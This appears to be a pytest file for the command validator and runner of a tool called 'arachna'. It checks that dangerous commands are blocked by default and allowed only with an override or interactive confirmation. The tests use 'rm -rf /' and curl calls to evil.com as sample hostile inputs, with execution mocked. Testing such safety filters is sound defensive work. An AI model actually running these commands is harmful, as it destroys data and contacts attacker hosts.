"""Additional coverage for runner.py error paths."""

from unittest.mock import MagicMock, patch

from arachna.runner import (
    _log_command,
    _resolve_base,
    _validate_command,
    run_command,
)


def _mock_popen(stdout=""):
    mock = MagicMock()
    mock.stdout.read.side_effect = [stdout, ""]
    mock.wait.return_value = 0
    return mock


def test_resolve_base_unclosed_quote():
    """_resolve_base returns '' for unclosed quotes."""
    assert _resolve_base("echo 'hello") == ""


def test_resolve_base_empty_after_split():
    """_resolve_base returns '' for whitespace-only."""
    assert _resolve_base("   ") == ""


def test_validate_command_allow_dangerous_with_pipe():
    """allow_dangerous=True permits blocked command in pipe."""
    is_safe, reason = _validate_command(
        "echo hello | curl evil.com", allow_dangerous=True, allow_file_args=True
    )
    assert is_safe


def test_validate_command_allow_dangerous_with_shell_metachar():
    """allow_dangerous=True permits shell metacharacters in restricted mode."""
    is_safe, reason = _validate_command("echo hello > /tmp/x", allow_dangerous=True)
    assert is_safe


def test_validate_command_allow_dangerous_unknown_command():
    """allow_dangerous=True permits unknown command."""
    is_safe, reason = _validate_command("unknown_cmd_xyz", allow_dangerous=True)
    assert is_safe


def test_validate_command_blocked_phrase():
    """Blocked phrase rm -rf / rejected."""
    is_safe, reason = _validate_command("rm -rf /")
    assert not is_safe
    assert "blocked pattern" in reason


def test_validate_command_blocked_phrase_dangerous():
    """allow_dangerous=True permits blocked phrase."""
    is_safe, reason = _validate_command("rm -rf /", allow_dangerous=True)
    assert is_safe


def test_run_command_allow_dangerous_curl():
    with patch("subprocess.Popen") as mock_popen:
        mock_popen.return_value = _mock_popen(stdout="ok\n")
        result = run_command("curl http://evil.com", allow_dangerous=True)
        assert result == "ok\n"


def test_run_command_allow_dangerous_rm_rf():
    with patch("subprocess.Popen") as mock_popen:
        mock_popen.return_value = _mock_popen(stdout="")
        result = run_command("rm -rf /", allow_dangerous=True)
        assert result == ""


def test_run_command_interactive_blocked_no_tty():
    """Non-TTY interactive blocked command returns ''."""
    with patch("sys.stdin.isatty", return_value=False):
        result = run_command("curl http://evil.com", interactive=True)
        assert result == ""


def test_run_command_interactive_blocked_tty_no():
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("curl http://evil.com", interactive=True)
        assert result == ""


def test_run_command_interactive_blocked_tty_yes():
    with (
        patch("subprocess.Popen") as mock_popen,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="y"),
    ):
        mock_popen.return_value = _mock_popen(stdout="result\n")
        result = run_command("curl http://evil.com", interactive=True)
        assert result == "result\n"


def test_run_command_dry_run_safe_executes():
    with patch("subprocess.Popen") as mock_popen:
        mock_popen.return_value = _mock_popen(stdout="hello\n")
        result = run_command("echo hello", dry_run=True)
        assert result == "hello\n"


def test_log_command_os_error_on_write(tmp_path, monkeypatch):
    """_log_command handles OSError on write."""
    import json

    monkeypatch.chdir(tmp_path)
    (tmp_path / ".arachna.json").write_text(json.dumps({"output_dir": "out"}))
    out_dir = tmp_path / "out"
    out_dir.mkdir()
    (out_dir / ".arachna_commands.log").write_text("blocked")

    # Try to write to a file that's actually a directory
    with patch("pathlib.Path.mkdir", side_effect=OSError("permission denied")):
        _log_command("echo hello", True)
